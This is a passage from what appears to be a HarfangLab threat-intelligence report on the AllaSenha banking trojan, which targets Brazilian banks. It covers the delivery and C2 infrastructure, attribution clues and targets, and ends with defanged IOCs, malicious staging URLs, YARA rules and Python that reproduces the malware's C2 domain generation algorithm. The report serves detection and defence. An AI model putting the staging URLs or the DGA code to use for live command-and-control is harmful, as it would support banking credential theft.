<td><code>files\a3.cmd</code></td>
<td>2024-03-11</td>
</tr>
<tr>
<td><code>\\191.234.212[.]140@80\Documentos\</code></td>
<td><code>2c53b4dc15882cf22772994d8ed0947e4a8b70aef3a12ab190017b3317c167ea</code></td>
<td><code>files\a3.cmd</code></td>
<td>2024-04-08</td>
</tr>
<tr>
<td><code>\\191.239.116[.]217@80\Documentos\</code></td>
<td><code>a6d995d015c16985b456bcc5cd44377c3e5e5cf72b17771eadc51e1d02a3c6ef</code></td>
<td><code>files\a3.cmd</code></td>
<td>2024-04-11</td>
</tr>
<tr>
<td><code>\\191.235.87[.]229@80\Documentos\</code></td>
<td><code>1b4f44a00f61b3e0c8cd6c3125f03b6d4897d6ab90c8a6dc899ed96acee80dd6</code></td>
<td><code>dc\c.cmd</code></td>
<td>2024-04-30</td>
</tr>
<tr>
<td><code>\\191.232.38[.]222@80\Documentos\</code></td>
<td><code>8424e76c9a4ee7a6d7498c2f6826fcde390616dc65032bebf6b2a6f8fbf4a535</code></td>
<td><code>dc\c.cmd</code></td>
<td>2024-05-01</td>
</tr>
<tr>
<td><code>\\20.197.250[.]132@80\Documentos\</code></td>
<td>Unknown</td>
<td><code>dc\c.cmd</code></td>
<td>2024-05-09</td>
</tr>
</tbody>
</table>
<p>We could identify several additional WebDAV paths from malicious LNK samples, but we could not retrieve reliable chronological and exposed services information for the associated servers &#8211; they are all listed in Appendix.</p>
<p>The DGA function in BPyCode takes the current date as an argument to generate 3 distinct hostnames. We could determine that associated generated hostnames were setup to deliver payloads daily. At the time of writing, the threat actor seem to have stopped using <code>*.brazilsouth.cloudapp.azure.com</code> hostnames for payload delivery. The DGA methodology leveraged to connect to Azure-hosted (possibly &#8220;serverless&#8221;) infrastructure shows that the threat actor tried to automate the creation and rotation of its delivery infrastructure.</p>
<h3>C2 servers</h3>
<p>Command and control servers were also hosted on Azure cloud infrastructure. As described in the sample analysis, AllaSenha also implements a DGA which ensures a daily C2 hostnames rotation. At the time of writing, newly generated domains appear to be inactive, indicating that attackers may have either paused their activity, changed their C2 infrastructure or modified their DGA.</p>
<h2>Attribution</h2>
<p>We could not reliably link the described activities to a known and consistently defined threat actor.</p>
<p>Yet the malicious files we analysed contained some clues that might be useful for attribution. The initial malicious LNK for instance contained information about the computer from which the file was created:</p>
<pre><code>ParsingPath: C:\Users\bert1m\Desktop\test.html
FolderPath: C:\Usuários\bert1m\Área de Trabalho
MAC address: 94:53:30:e7:6f:42
Hostname: desktop-20a11ho</code></pre>
<p>We can note that the local language of the computer on which the LNK file was generated is Portuguese (<code>C:\Usuários\</code>) &#8211; this is consistent with the targeting of AllaSenha (see below) and further language clues in BPyCode. AllaSenha samples that we retrieved (for instance, SHA-256 <code>278897ee9158f9843125bc2e26c14f96c4e79d5fc578b7e5973dc8dc919a3400</code>) also contained unstripped source code paths using the same <code>bert1m</code> username:</p>
<pre><code>C:\Users\bert1m\Desktop\Meu Driver\DELPHI XE5\Cliente\ZLibExApi.pas
C:\Users\bert1m\Desktop\Meu Driver\DELPHI XE5\Cliente\Conectar.pas</code></pre>
<p>This suggests that a single individual going by the <code>bert1m</code> nickname could be responsible for the development of multiple parts of the infection chain, from infection to the final malware. This however does not necessarily demonstrate that the developer is directly involved with the operation of such tools.</p>
<p>When searching for the <code>bert1m</code> nickname, we were able to find several public social media profiles, 2 of them at least matching Portuguese-speaking individuals, but could not reliably link any of those profiles further with any malicious activity or files.</p>
<h2>Targets</h2>
<p>Strictly sticking to the infection chain that we described and the resulting AllaSenha samples, we could only (and reliably) identify targets in Brazil. We do not benefit from enough contextual data to determine if individuals or organizations were specifically targeted.</p>
<p>Based on AllaSenha analysis, we can determine that the threat actor is specifically gathering credentials to access the following banks:</p>
<ul>
	<li>Banco do Brazil;</li>
	<li>Bradesco;</li>
	<li>Banco Safra;</li>
	<li>Itaú Unibanco;</li>
	<li>Sicoob;</li>
	<li>Caixa Econômica Federal.</li>
</ul>
<h2>Conclusion</h2>
<p>The ecosystem of cyber threats that specifically target Latin America<sup id="fnref1_ref_ak_bb"><a class="footnote-ref" href="#fn_ref_ak_bb">9</a></sup><sup id="fnref1_ref_ak_cr">,<a class="footnote-ref" href="#fn_ref_ak_cr">10</a></sup> is the home of peculiar malware samples and uncommon practices &#8211; but those are sometimes combined to well known infection or delivery techniques that are quite usual to the cybercrime landscape. Attackers keep regularly changing malicious infrastructure, infection methods and loaders to evade defenses, and while used techniques remain relatively simple, the lack of documentation and the determination of these groups make them a real threat.</p>
<p>The threat actors that operate in Latin America appear to be a particularly productive source of cybercrime campaigns. While almost exclusively targeting Latin American individuals to steal banking details, these actors often end up compromising computers that are indeed operated by subsidiaries or employees in Brazil, but that belong to companies all around the world. As a result, such threats should not be underestimated and require proper response, way beyond the Brazilian borders.</p>
<h2>Appendix</h2>
<h3>Indicators of compromise (IOCs)</h3>
<p>Associated IOCs are also <a href="https://github.com/HarfangLab/iocs/tree/main/TRR240501">available on our GitHub repository</a>.</p>
<h4>Hashes (SHA-256)</h4>
<pre><code>f848c0f66afc7b5a10f060c1db129529a974ae0ad71a767f7c7793351bb7ca04|Malicious LNK (NotaFiscal.pdf.lnk)
c300749ea44f886be1887b3e19b946efbdbbc3e1bf3e416c78cfbff8d23bf70a|Malicious LNK (NotaFiscal.pdf.lnk)
0d94547a0b8f9795e97e2a4a58b0ece65b4ea4b6e6019cbc96e1c79f373b4587|Malicious LNK (NotaFiscal.pdf.lnk)
d9877dc1ba0f977d100e687da59c216454d27e3988532652ac8f6331debbd071|Malicious LNK (NotaFiscal.pdf.lnk)
a6d995d015c16985b456bcc5cd44377c3e5e5cf72b17771eadc51e1d02a3c6ef|Malicious LNK (NotaFiscal.pdf.lnk)
21e22c4736e7567b198b505ed303c3ca933e0c2d931b886756f6db18a9884a75|Malicious LNK (NotaFiscal.pdf.lnk)
2c1251ae1ec9d417bbbdd1f6ac99baa3f16a7639d0c12cb2883ef8c22c73e58e|Malicious LNK (NotaFiscal.pdf.lnk)
e50bde1e319e699f587d3b5403c487e46deed61cc3f078fe951e7cb9f6896259|Malicious LNK (NotaFiscal.pdf.lnk)
f00cb0603c055c85c7cdf9963d919d527b13013c182dc115ba733d28da57b1d9|Malicious LNK (NotaFiscal.pdf.lnk)
2c53b4dc15882cf22772994d8ed0947e4a8b70aef3a12ab190017b3317c167ea|Malicious LNK (NotaFiscal.pdf.lnk)
46e754727efdc2c891319d25a67ee999a4d8a0b21b0113db08eead42cf51b780|Malicious LNK (NotaFiscal.pdf.lnk)
cd9f5773bd7672a3e09f2d05ef26775e8c7241879d5f4d13c5c5bc1704c49fa1|Malicious LNK (NotaFiscal.pdf.lnk)
8424e76c9a4ee7a6d7498c2f6826fcde390616dc65032bebf6b2a6f8fbf4a535|Malicious LNK (NotaFiscal.pdf.lnk)
1b4f44a00f61b3e0c8cd6c3125f03b6d4897d6ab90c8a6dc899ed96acee80dd6|Malicious LNK (NotaFiscal.pdf.lnk)
4546bc56c85ad2967859dc34b2c84f15891fcd192e86bfc630c49dc8d59e3e71|BPyCode launcher (c.cmd)
40c37bfcc9b0e0d1b3840cb7c751162fec91fe833d4caf4a17bc8b97d53c88b5|BPyCode launcher (c.cmd)
a839dfbe1e7979dbd15ef6c5e472afb3efca044ee8ad27185b01161ce01e4f36|BPyCode launcher (a3.cmd)
610f0ec33603ef4d1fd6530a8f6b0121a4c9cc62fb6fa2ceee8e2f5b2f866e4c|BPyCode launcher (a3.cmd)
c0bf82a3f7807e0c88076e0d500b07e253b106914058b02e112d45eeb6209998|BPyCode launcher (a3.cmd)
6f05d8f85384808036d3c77732b056e2b9cd429587a77b6be3ccdbd4bb558023|BPyCode launcher (a3.cmd)
3962c8a4d0472f91d4be45140eccf661ad6c579319953156dec438dc6a07eeb2|BPyCode launcher (a3.cmd)
b2e1f630c4593830ead91e7f3615d8d5214762dc5a1dd65bef7382d6f6c9f258|BPyCode launcher (a3.cmd)
010d9f1f16c01db5ff37ff9b519d7ecf3be096e00ae597d7bec12b7099b2f852|BPyCode launcher (a3.cmd)
eb2cd71e72ff676d80eb746b961840fea3601d8f6402201d7c0e849a670240ee|BPyCode launcher (a3.cmd)
643563613fb78f88fd90a6cf253ace9e9e6686568fdf6b6d7ec9760667d4d72b|BPyCode
f2db799d892f2a7ac82bfa15826e74d778abdfa153ccafb9db1fdf56a0248a40|BPyCode
d051c0aee007f2a1d0026330719a45e81c726251015837e66cf9348df3bd7210|BPyCode
dd3f1829cc743942d1fc3719c8d8162bc45ca624352ac71f43c08dafd54bbb7f|BPyCode
8a1aba66841ae4b20df95eea8a271538453a76a53596fd3254d47d4d57a3ab3a|BPyCode
3b450994add1e3a206c56a7f8fd28e4132cffb27f3df345e07e8908d7989751f|BPyCode
35329c2fb7a1844576a5defd5d9a7d250d78db51479b2612e3923e18539b0695|BPyCode
19c02c5724622be4eedff95633f3fbaa604449aa50cc0761693bb8adb1e8cf97|BPyCode
5782b9bc96ce5ad011c122496ff0ff0dc08d6444c6d2e98606ada82130d5f21a|BPyCode
6149a3d1cff3afe3ebb9ac091844a3b7db7533aa69801c98d00b19cdb8b18c9e|BPyCode persistence (C:\Users\Public\&lt;filename&gt;.txt)
99d0de52a63e5ff790e468dbb8cd0d5273b51ca3b67b5963c0bdedc3a4f44f12|ExecutorLoader (executor.dll)
3b0eb25ed6c0dff76a613bdcfd20ca1d2f482e3c1739747bf50834ca784e66bb|ExecutorLoader (executor.dll)
19594c51c61fc5fd833ddd0eecb648acebdf4d789b337f00cda0a03efbb1afcf|ExecutorLoader (executor.dll)
7e0051d9221c13a47245359a2cd2804b4d3d9302a321fc8085da1cf1a64bac91|ExecutorLoader (Execute_dll.exe)
b8b3963967232916cd721a22c80c11cd33057bd5629dcfa3f4b03d8a6dbf1403|ExecutorLoader (Execute_dll.exe)
e7aa64726783ec6f7249483e984ae20b31a091a488a3ed0f83c210702c506d20|ExecutorLoader (Execute_dll.exe)
65d86160cd4a08d60ada7fcafb7ed9493bf6dacfa098dba27f7851f1bb8de841|UPX-packed AllaSenha
ac4b4b6cfe4d4e8710384246c008764cdb7547a6c3081e72687fefdf0614c7a5|UPX-unpacked AllaSenha
b152346c2679392d7e15d1cc72a39a21d24e55360c4c1c845ef3524924e93fa9|AllaSenha
7232e3318fdc370e611b2bcbaaec3d58a0d687927714c24dc81fe60767d53a31|AllaSenha
883c49b7c869019951eff94699480a7ecc97c9c45060a15797ecbd5fce060d26|AllaSenha
561e6a42e23d12abe6bba8c98f84c3ba7c45a5df840bfa6fd0dfea803c9b4b7e|AllaSenha
ab3a284ae6e4e466a0715c162cfab85d75522bec48fa25947b16a0891ec2358a|AllaSenha
278897ee9158f9843125bc2e26c14f96c4e79d5fc578b7e5973dc8dc919a3400|AllaSenha
3c89775ae7c35fe3d1ec7e75ac9d4a19959d082d31ab412af243125440ffea6c|AllaSenha</code></pre>
<h4>Domains</h4>
<pre><code>nfe-digital[.]digital|Phishing URLs root domain
nfe-digital[.]top|Phishing URLs root domain</code></pre>
<h4>Possibly malicious and/or associated domains</h4>
<pre><code>nfe-digital[.]online|Possibly malicious and/or associated domain
nfe-digital[.]site|Possibly malicious and/or associated domain</code></pre>
<h4>URLs</h4>
<pre><code>\\abrir-documento-adobe-reader-1.brazilsouth.cloudapp.azure[.]com@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\104.41.57[.]122@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.235.235[.]69@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\4.203.105[.]118@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.234.212[.]140@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.233.241[.]96@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.232.38[.]222@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.239.116[.]217@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\104.41.51[.]80@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.235.233[.]246@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.233.248[.]170@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.239.123[.]241@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\191.235.87[.]229@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
\\20.197.250[.]132@80\Documentos\|WebDAV stager path (on legitimate Azure infrastructure)
hxxps://raw.githubusercontent[.]com/marinabarros320168/new/main/Execute_dll.exe|ExecutorLoader staging URL (on legitimate Github infrastructure)
hxxps://raw.githubusercontent[.]com/alexiadarocha195267/rp/raw/main/Execute_dll.zip|ExecutorLoader staging URL (on legitimate Github infrastructure)
hxxp://jucatyo6.autodesk360[.]com/shares/download/file/SHd38bfQT1fb47330c999c2a86b9a6d091b6/dXJuOmFkc2sud2lwcHJvZDpmcy5maWxlOnZmLnY0Uk5ubHlyU0JXd0hlLXJyZWk0T2c_dmVyc2lvbj0x?bfccc0fd975348c980dd89e57f94815f|Stager for a likely associated and previous variant of BPyCode execution (on legitimate AutoDesk infrastructure)
hxxps://dpsols7.autodesk360[.]com/shares/download/file/SHd38bfQT1fb47330c99c55d44aacebd2ec7/dXJuOmFkc2sud2lwcHJvZDpmcy5maWxlOnZmLjhZc1hBS2Q2VHNDa0Z1NkZ0Q2tQdHc_dmVyc2lvbj00?b44bb61abebf41d695a4580f072d9b74|Stager for a likely associated and previous variant of BPyCode execution (on legitimate AutoDesk infrastructure)</code></pre>
<h3>YARA rules</h3>
<pre><code class="language-yara">rule allasenhamaycampaign_executorloader
{
    meta:
        description = "Detects Delphi ExecutorLoader DLLs and executables."
        references = "TRR240501"
        date = "2024-05-28"
        author = "HarfangLab"
        context = "file,memory"
    strings:
        $delphi = "Embarcadero Delphi" ascii fullword
        $s1 = "\\SysWOW64\\mshta.exe" wide fullword
        $s2 = "\\System32\\mshta.exe" wide fullword
        $s3 = "RcDll" wide fullword
        $default1 = "Default_" wide fullword
        $default2 = "Default~" wide fullword
    condition:
        $delphi
        and all of ($s*)
        and any of ($default*)
}

rule allasenhamaycampaign_allasenha
{
    meta:
        description = "Detects AllaSenha banking trojan DLLs."
        references = "TRR240501"
        date = "2024-05-28"
        author = "HarfangLab"
        context = "file,memory"
    strings:
        $a1 = "&lt;|NOSenha|&gt;" wide fullword
        $a2 = "&lt;|SENHA|&gt;QrCode: " wide fullword
        $a3 = "&lt;|SENHA|&gt;Senha 6 : " wide fullword
        $a4 = "&lt;|SENHA|&gt;Snh: " wide fullword
        $a5 = "&lt;|SENHA|&gt;Token: " wide fullword
        $a6 = "&lt;|BB-AMARELO|&gt;" wide fullword
        $a7 = "&lt;|BB-AZUL|&gt;" wide fullword
        $a8 = "&lt;|BB-PROCURADOR|&gt;" wide fullword
        $a9 = "&lt;|ITAU-SNH-CARTAO|&gt;" wide fullword
        $a10 = "&lt;|ITAU-TK-APP|&gt;" wide fullword
        $dga = { 76 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 78 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 7A 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 77 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 6B 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 79 00 00 00 }
    condition:
        $dga
        and (4 of ($a*))
}</code></pre>
<h3>AllaSenha DGA</h3>
<p>This Python code snippet is reproducing the logic of AllaSenha&#8217;s domain generation algorithm (which is generating C2 hostnames).</p>
<pre><code class="language-python">import datetime

def day_to_letter(i):
    if i &gt; 26:
        i //= 2
    return "_abcdefghijlmnopqrstuvxzwky"[i]

def to_signed_str(unsigned_value):
    """
    Converts an integer into the corresponding signed value, returned as a string.
    :param unsigned_value: The input integer to convert
    :return: The corresponding string
    """
    bit_length = 32
    if unsigned_value &gt;= 2**(bit_length - 1):
        signed_value = unsigned_value - 2**bit_length
    else:
        signed_value = unsigned_value
    return str(signed_value)

def intstr_to_domain(s):
    """
    The input is a string which contains only digits. This function takes them either one or two at a time
    to be used as indexes in a hardcoded array. If taking two digits makes for too big an index, only one
    is used - this explains the huge disparity in the distribution of letters.
    :param s:
    :return:
    """
    key = "__abcdefghijlmnopqrstuvxzwky"
    out = ""
    i = 0
    while i &lt; len(s):
        if i == len(s) - 1 or int(s[i:i+2]) &gt;= 28:
            if int(s[i:i+1]) &gt;= 2:
                out += key[int(s[i])]
            i += 1
        else:
            if int(s[i:i+2]) &gt;= 2:
                out += key[int(s[i:i+2])]
            i += 2
    return out.rstrip('_')

d = datetime.datetime(year=2024, month=5, day=28)  # Change to the desired date
day_of_year = d.timetuple().tm_yday
day_of_week = (d.weekday() + 1) % 7 + 1
week_of_year = d.isocalendar()[1]
domain = day_to_letter(d.day)

key = {
    "ITAU-APP": 0x55,
    "BB": 0x56,
    "default": 0x57
}
multiplicator = key["default"]

calculus1 = d.day**2 * day_of_year * multiplicator**3 &amp; 0xFFFFFFFF
calculus2 = day_of_year**2 * d.day * multiplicator &amp; 0xFFFFFFFF
calculus3 = day_of_year * d.day * multiplicator &amp; 0xFFFFFFFF
calculus4 = d.month * day_of_year * d.day * multiplicator &amp; 0xFFFFFFFF
calculus5 = week_of_year * day_of_year * d.day * multiplicator &amp; 0xFFFFFFFF

input_str = (f"{to_signed_str(calculus1)}{to_signed_str(calculus2)}{to_signed_str(calculus3)}{to_signed_str(calculus4)}"
             f"{to_signed_str(calculus5)}{to_signed_str(calculus5)}")

print(domain + intstr_to_domain(input_str) + ".brazilsouth.cloudapp.azure[.]com")</code></pre>
<div class="footnotes">
<hr />
<ol>
	<li id="fn_allakore">
<p><a href="https://github.com/OneideLuizSchneider/AllaKore_Remote">https://github.com/OneideLuizSchneider/AllaKore_Remote</a> <a class="footnote-backref" href="#fnref1_allakore" rev="footnote">↩</a> <a class="footnote-backref" href="#fnref2_allakore" rev="footnote">↩</a></p>
</li>
	<li id="fn_edgefail">
<p>The default PDF reader should not be able to display the created PDF file, as it is not a valid PDF. <a class="footnote-backref" href="#fnref1_edgefail" rev="footnote">↩</a></p>
</li>
	<li id="fn_namealg">
<p>The generated name is the lowercased and reversed local name of the targeted machine, without dashes characters, and without the &#8220;DESKTOP&#8221; word if any. <a class="footnote-backref" href="#fnref1_namealg" rev="footnote">↩</a> <a class="footnote-backref" href="#fnref2_namealg" rev="footnote">↩</a></p>
</li>
	<li id="fn_azurefuncs">
<p><a href="https://learn.microsoft.com/en-us/azure/azure-functions/functions-overview?pivots=programming-language-csharp">https://learn.microsoft.com/en-us/azure/azure-functions/functions-overview?pivots=programming-language-csharp</a> <a class="footnote-backref" href="#fnref1_azurefuncs" rev="footnote">↩</a></p>
</li>
	<li id="fn_pickle">
<p><a href="https://docs.python.org/3/library/pickle.html">https://docs.python.org/3/library/pickle.html</a> <a class="footnote-backref" href="#fnref1_pickle" rev="footnote">↩</a></p>
</li>
	<li id="fn_pythonmemorymodule">
<p><a href="https://github.com/naksyn/PythonMemoryModule">https://github.com/naksyn/PythonMemoryModule</a> <a class="footnote-backref" href="#fnref1_pythonmemorymodule" rev="footnote">↩</a></p>
</li>
	<li id="fn_serversocket">
<p><a href="https://github.com/haithemnini/ServerSocket">https://github.com/haithemnini/ServerSocket</a> <a class="footnote-backref" href="#fnref1_serversocket" rev="footnote">↩</a></p>
</li>
	<li id="fn_gorki">
<p><a href="https://github.com/oxahax/Brazilian-Malwares/tree/master/Pascal-Delphi/KL-REMOTA-KL/KL%20Gorki">https://github.com/oxahax/Brazilian-Malwares/tree/master/Pascal-Delphi/KL-REMOTA-KL/KL%20Gorki</a> <a class="footnote-backref" href="#fnref1_gorki" rev="footnote">↩</a></p>
</li>
	<li id="fn_ref_ak_bb">
<p><a href="https://blogs.blackberry.com/en/2024/01/mexican-banks-and-cryptocurrency-platforms-targeted-with-allakore-rat">https://blogs.blackberry.com/en/2024/01/mexican-banks-and-cryptocurrency-platforms-targeted-with-allakore-rat</a> <a class="footnote-backref" href="#fnref1_ref_ak_bb" rev="footnote">↩</a></p>
</li>
	<li id="fn_ref_ak_cr">
<p><a href="https://www.cybereason.com/blog/research/brazilian-financial-malware-banking-europe-south-america">https://www.cybereason.com/blog/research/brazilian-financial-malware-banking-europe-south-america</a> <a class="footnote-backref" href="#fnref1_ref_ak_cr" rev="footnote">↩</a></p>
</li>
	<li id="fn_nfse">
<p><a href="https://www.gov.br/nfse/pt-br/copy_of_perguntas-frequentes/copy_of_faq-nfs-e">https://www.gov.br/nfse/pt-br/copy_of_perguntas-frequentes/copy_of_faq-nfs-e</a> <a class="footnote-backref" href="#fnref1_nfse" rev="footnote">↩</a></p>
</li>
	<li id="fn_github_dbat">
<p><a href="https://github.com/executemalware/Malware-IOCs/blob/main/2023-11-28%20Possible%20DBatLoader%20IOCs">https://github.com/executemalware/Malware-IOCs/blob/main/2023-11-28%20Possible%20DBatLoader%20IOCs</a>, NB: in spite of the claims from this reference, we could not associate the infection chain and payloads that we describe with DBatLoader <a class="footnote-backref" href="#fnref1_github_dbat" rev="footnote">↩</a></p>
</li>
	<li id="fn_search">
<p><a href="https://learn.microsoft.com/en-us/windows/win32/shell/search-protocol#examples">https://learn.microsoft.com/en-us/windows/win32/shell/search-protocol#examples</a> <a class="footnote-backref" href="#fnref1_search" rev="footnote">↩</a></p>
</li>
	<li id="fn_hostgator">
<p><a href="https://www.hostgator.com.br/">https://www.hostgator.com.br/</a> <a class="footnote-backref" href="#fnref1_hostgator" rev="footnote">↩</a></p>
</li>
</ol>
</div>
                                                            <div class="single-dates">
                                    <time class="single-date single-date--published" datetime="2024-05-28T16:36:48+02:00" itemprop="datePublished">
                                        Published on 28 May, 2024                                    </time>
                                                                        <time class="single-date single-date--modified" datetime="2024-10-11T11:43:29+02:00" itemprop="datePublished">
                                        Last update on 11 October, 2024                                    </time>
                                                                    </div>
                            
                            </section>
                            <section class="single-related">
        <div class="container">
            <div class="wrapper swiper js_relatedSwiper">
                <header>
                    <strong class="title">More <span class="text-gradient">articles</span></strong>
                </header>
                <div class="swiper-wrapper">
                    <a href="https://harfanglab.io/insidethelab/unpacking-packxor/" 
    id="card-128863"
    data-color="#7f1fff"    class="grid__item swiper-slide card card--inside  card--color-purple">
        <figure class="card-thumbnail">
        
										<picture class="card-img img-fluid full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/09/image.png.webp 1x, https://harfanglab.io/medias/2024/09/image.png.webp 2x" sizes="100vw"/>
<img srcset="https://harfanglab.io/medias/2024/09/image.png 1x, https://harfanglab.io/medias/2024/09/image.png 2x" alt="Header image for PackXor" width="1456" height="816" src="https://harfanglab.io/medias/2024/09/image.png" sizes="100vw"/>
</picture>

						                <figcaption class="badge-group background-gradient category--cyber-threat-intelligence-en">
            <span class="badge-group-item badge-group-item--pill">
                CYBER THREAT INTELLIGENCE            </span>
        </figcaption>
            </figure>
        <div class="card-wrapper">
        <header class="card-header">
            <h3 class="card-title">Unpacking the unpleasant FIN7 gift: PackXOR</h3>        </header>
        <section class="card-body">
            <div class="card-text"><p>Summary In early July 2024, the Sentinel Labs researchers released an extensive article1 about &#8220;FIN7 reboot&#8221; tooling, notably introducing &#8220;AvNeutralizer&#8221;, an anti-EDR tool. This tool has been found in the wild as a packed payload. In this article, we offer&hellip;</p>
</div>        </section>
        <footer class="card-footer">
            <div class="card-informations">
                <time class="post-date post-date--published" datetime="2024-09-04T16:02:09+02:00" itemprop="datePublished">
                    Published on 4 September, 2024                </time>
                <span class="post-reading-time"> 14 min</span>            </div>
        </footer>
    </div>
</a><a href="https://harfanglab.io/insidethelab/hijackloader-abusing-genuine-certificates/" 
    id="card-130188"
    data-color="#7f1fff"    class="grid__item swiper-slide card card--inside  card--color-purple">
        <figure class="card-thumbnail">
        
										<picture class="card-img img-fluid full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/10/banner-480x360.jpg.webp 1x, https://harfanglab.io/medias/2024/10/banner-960x720.jpg.webp 2x" sizes="100vw"/>
<img srcset="https://harfanglab.io/medias/2024/10/banner-480x360.jpg 1x, https://harfanglab.io/medias/2024/10/banner-960x720.jpg 2x" alt="Banner for" width="480" height="360" src="https://harfanglab.io/medias/2024/10/banner-480x360.jpg" sizes="100vw"/>
</picture>

						                <figcaption class="badge-group background-gradient category--cyber-threat-intelligence-en">
            <span class="badge-group-item badge-group-item--pill">
                CYBER THREAT INTELLIGENCE            </span>
        </figcaption>
            </figure>
        <div class="card-wrapper">
        <header class="card-header">
            <h3 class="card-title">HijackLoader evolution: abusing genuine signing certificates</h3>        </header>
        <section class="card-body">
            <div class="card-text"><p>Summary Since mid-September 2024, our telemetry has revealed a significant increase in &#8220;Lumma Stealer&#8221;1 malware deployments via the &#8220;HijackLoader&#8221;2 malicious loader. On October 2, 2024, HarfangLab EDR detected and blocked yet another HijackLoader deployment attempt &#8211; except this time, the&hellip;</p>
</div>        </section>
        <footer class="card-footer">
            <div class="card-informations">
                <time class="post-date post-date--published" datetime="2024-10-11T13:52:28+02:00" itemprop="datePublished">
                    Published on 11 October, 2024                </time>
                <span class="post-reading-time"> 16 min</span>            </div>
        </footer>
    </div>
</a><a href="https://harfanglab.io/insidethelab/compromised-routers-infrastructure-target-europe-caucasus/" 
    id="card-26100"
    data-color="#7f1fff"    class="grid__item swiper-slide card card--inside  card--color-purple">
        <figure class="card-thumbnail">
        
										<picture class="card-img img-fluid full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/01/banner-480x360.jpg.webp 1x, https://harfanglab.io/medias/2024/01/banner-960x692.jpg.webp 2x" sizes="100vw"/>
<img srcset="https://harfanglab.io/medias/2024/01/banner-480x360.jpg 1x, https://harfanglab.io/medias/2024/01/banner-960x692.jpg 2x" alt="banner" width="480" height="360" src="https://harfanglab.io/medias/2024/01/banner-480x360.jpg" sizes="100vw"/>
</picture>

						                <figcaption class="badge-group background-gradient category--cyber-threat-intelligence-en">
            <span class="badge-group-item badge-group-item--pill">
                CYBER THREAT INTELLIGENCE            </span>
        </figcaption>
            </figure>
        <div class="card-wrapper">
        <header class="card-header">
            <h3 class="card-title">Compromised routers are still leveraged as malicious infrastructure to target government organizations in Europe and Caucasus</h3>        </header>
        <section class="card-body">
            <div class="card-text"><p>Identifier: TRR240101. On 2023-12-28, the Ukrainian government computer emergency and incident response team (CERT-UA) described a malicious espionage campaign that targeted government organizations in Ukraine. CERT-UA attributed the campaign to the APT28 threat-actor (aka Sofacy, Fancy Bear, etc.). The malicious&hellip;</p>
</div>        </section>
        <footer class="card-footer">
            <div class="card-informations">
                <time class="post-date post-date--published" datetime="2024-01-29T16:07:50+01:00" itemprop="datePublished">
                    Published on 29 January, 2024                </time>
                <span class="post-reading-time"> 20 min</span>            </div>
        </footer>
    </div>
</a><a href="https://harfanglab.io/insidethelab/loader-galore-taskloader-at-the-start-of-a-pay-per-install-infection-chain/" 
    id="card-26054"
    data-color="#7f1fff"    class="grid__item swiper-slide card card--inside  card--color-purple">
        <figure class="card-thumbnail">
        
										<picture class="card-img img-fluid full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2023/12/taskloader-480x360.png.webp 1x, https://harfanglab.io/medias/2023/12/taskloader-960x533.png.webp 2x" sizes="100vw"/>
<img srcset="https://harfanglab.io/medias/2023/12/taskloader-480x360.png 1x, https://harfanglab.io/medias/2023/12/taskloader-960x533.png 2x" alt="TaskLoader" width="480" height="360" src="https://harfanglab.io/medias/2023/12/taskloader-480x360.png" sizes="100vw"/>
</picture>

						                <figcaption class="badge-group background-gradient category--cyber-threat-intelligence-en">
            <span class="badge-group-item badge-group-item--pill">
                CYBER THREAT INTELLIGENCE            </span>
        </figcaption>
            </figure>
        <div class="card-wrapper">
        <header class="card-header">
            <h3 class="card-title">Taskloader at the root of a Pay-per-Install infection chain</h3>        </header>
        <section class="card-body">
            <div class="card-text"><p>In June 2023, we’ve observed multiple alerts that seemingly came from different sources. A quick search through our telemetry allowed us to identify multiple infected machines across our clients. Although they would sometimes present different behaviour, the initial infection vector&hellip;</p>
</div>        </section>
        <footer class="card-footer">
            <div class="card-informations">
                <time class="post-date post-date--published" datetime="2023-09-28T11:51:34+02:00" itemprop="datePublished">
                    Published on 28 September, 2023                </time>
                <span class="post-reading-time"> 21 min</span>            </div>
        </footer>
    </div>
</a>                </div>
                <div class="swiper-controls">
                    <div class="swiper-button-prev"><span class="icon icon-arrow-swiper"></span></div>
                    <div class="swiper-button-next"><span class="icon icon-arrow-swiper"></span></div>
                </div>
            </div>
        </div>
    </section>
    <!-- /section.--related -->

                        <footer class="single-footer">
                            <div class="container">
                                <div class="wrapper">
                                                                                                </div>
                            </div>
                        </footer>

                    </section>
                                        <aside class="single-sidebar">
                        <div class="single-aside single-aside--author"><div class="author">
            <figure>
            <img width="512" height="512" src="/files/plugins/avatar-privacy/public/images/mystery.svg" alt="Cyber Threat Research Team" class="img-fluid full rounded-circle author-avatar">
        </figure>
        <div class="author-informations">
        <strong class="author-name">Cyber Threat Research Team</strong>                    </div>
</div>
</div><div class="single-aside single-aside--author"><div class="author">
        <div class="author-informations">
                            </div>
</div>
</div><div class="single-aside single-aside--shares">
    <p>Share this post :</p>
    <a class="sharer btn-share" id="gtm-share-twitter" target="_blank" href="https://x.com/intent/tweet?url=https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/&text=AllaSenha: AllaKore variant leverages Azure cloud C2 to steal banking details in Latin America&via=" rel="noopener">
        <i class="icon-twitter"></i>
        <span>X</span>
    </a>
